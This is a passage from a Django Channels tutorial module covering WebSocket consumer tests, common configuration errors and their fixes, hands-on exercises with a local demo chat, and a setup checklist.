        await comm.disconnect()
```

### Test 4: an anonymous user is rejected

```python
    async def test_anonymous_user_is_rejected(self):
        # No cookie — anonymous
        comm = WebsocketCommunicator(
            application,
            f"/ws/groups/{self.group.pk}/chat/",
        )
        connected, _ = await comm.connect()
        self.assertFalse(connected)
        await comm.disconnect()
```

### Test 5: broadcast between two users

```python
    async def test_message_broadcast_to_all_members(self):
        await database_sync_to_async(self.group.user_set.add)(self.other_user)

        comm1 = self._communicator(user=self.user)
        comm2 = self._communicator(user=self.other_user)

        await comm1.connect()
        await comm2.connect()

        await comm1.send_json_to({'content': 'Привіт від testuser'})

        response1 = await comm1.receive_json_from()
        response2 = await comm2.receive_json_from()

        self.assertEqual(response1['type'], 'message')
        self.assertEqual(response1['content'], 'Привіт від testuser')

        self.assertEqual(response2['type'], 'message')
        self.assertEqual(response2['content'], 'Привіт від testuser')
        self.assertEqual(response2['author'], 'testuser')

        await comm1.disconnect()
        await comm2.disconnect()
```

### Test 6: the message is saved to the DB

```python
    async def test_message_saved_to_database(self):
        from notes_app.models import ChatMessage

        comm = self._communicator(user=self.user)
        await comm.connect()

        await comm.send_json_to({'content': 'Тестове повідомлення'})
        await comm.receive_json_from()  # wait for the broadcast reply

        count = await database_sync_to_async(
            ChatMessage.objects.filter(
                group=self.group,
                author=self.user,
                content='Тестове повідомлення',
            ).count
        )()
        self.assertEqual(count, 1)

        await comm.disconnect()
```

### Running the consumer tests

```bash
# Consumer tests
docker compose run --rm web python manage.py test \
    notes_app.tests.test_consumers -v 2

# All tests (except Selenium)
docker compose run --rm web python manage.py test \
    notes_app.tests.test_models \
    notes_app.tests.test_services \
    notes_app.tests.test_forms \
    notes_app.tests.test_views \
    notes_app.tests.test_consumers -v 2
```

---

## Common mistakes

### The full table

| Error | Cause | Fix |
|---------|---------|-------------|
| `SynchronousOnlyOperation` | sync ORM in an async context | `@database_sync_to_async` |
| `AppRegistryNotReady` | an import before `get_asgi_application()` | Move the imports after it |
| `TimeoutError reading from redis` | `socket_timeout=5` vs brpop | `"socket_timeout": None` |
| WS 400 through nginx | Missing Upgrade headers | `proxy_http_version 1.1` + Upgrade headers |
| The WS connection closes after idling | `socket_timeout=5` in Redis | `"socket_timeout": None, "health_check_interval": 30` |
| History doesn't arrive | The QuerySet is lazy | `list(qs.values(...))` in `@database_sync_to_async` |
| `daphne` doesn't override runserver | `daphne` is not first in INSTALLED_APPS | Move `daphne` to the top |
| The consumer isn't found | `routing.py` is missing in asgi.py | Wire up `websocket_urlpatterns` |

### Examples of fixes

```python
# SynchronousOnlyOperation:
# ❌
async def connect(self):
    group = Group.objects.get(pk=self.group_pk)
# ✅
@database_sync_to_async
def get_group(self, pk):
    return Group.objects.get(pk=pk)

# AppRegistryNotReady:
# ❌ asgi.py — an import BEFORE get_asgi_application():
from notes_project.routing import websocket_urlpatterns
django_asgi_app = get_asgi_application()
# ✅
django_asgi_app = get_asgi_application()
from notes_project.routing import websocket_urlpatterns

# time.sleep() blocks the event loop:
# ❌
async def connect(self):
    time.sleep(1)
# ✅
async def connect(self):
    await asyncio.sleep(1)
```

---

## Practical task

**Task 1 — observation:**
```bash
docker compose up -d
# DevTools → Network → WS
# Open the chat → find the ws://... connection
# Send a message → look at the WS frames
```

**Task 2 — broadcast:**
```
Open two browsers as demo_alice and demo_bob (password: demo1234)
Send a message from one → did it appear in the other without a reload?
```

**Task 3 — understanding the code:**
```
Find the load_history() method in consumers.py.
Why does it return list(qs.values(...)) and not just qs?
What happens if you remove list()?
```

**Task 4 — authorization:**
```
Try to connect to a group you are not a member of.
What close code do you see in DevTools → Network → WS? (it should be 4003)
```

**Task 5 — logging:**
```python
# Add this in connect() before accept():
import logging
logger = logging.getLogger(__name__)

async def connect(self):
    ...
    logger.info(f"User {self.user.username} connected to group {self.group_pk}")
    await self.accept()

# Restart and look at:
docker compose logs -f web
```

---

## Self-check checklist

- [ ] `daphne` is first in `INSTALLED_APPS`
- [ ] `channels` is in `INSTALLED_APPS`
- [ ] `ASGI_APPLICATION = 'notes_project.asgi.application'` in settings.py
- [ ] `CHANNEL_LAYERS` is configured (InMemory or Redis)
- [ ] `"socket_timeout": None` in the RedisChannelLayer CONFIG
- [ ] `asgi.py`: `get_asgi_application()` BEFORE any import from notes_app
- [ ] `routing.py` is wired into `asgi.py`
- [ ] All ORM calls in the Consumer use `@database_sync_to_async`
- [ ] `load_history` returns `list(qs.values(...))`, not a QuerySet
- [ ] `disconnect()` calls `group_discard()`
- [ ] JS client: `escapeHtml()` for user content (XSS protection)
- [ ] nginx: `proxy_http_version 1.1` + `Upgrade` + `Connection` headers
- [ ] Consumer tests pass: `docker compose run --rm web python manage.py test notes_app.tests.test_consumers`

---

## Next

Next step: [08 — Celery and background tasks](08_celery.md) — Celery Worker, Beat, Redis broker, browser Toast notifications for reminders.

Documentation modules:
- [Async and Realtime](../09_async_and_realtime/README.md)
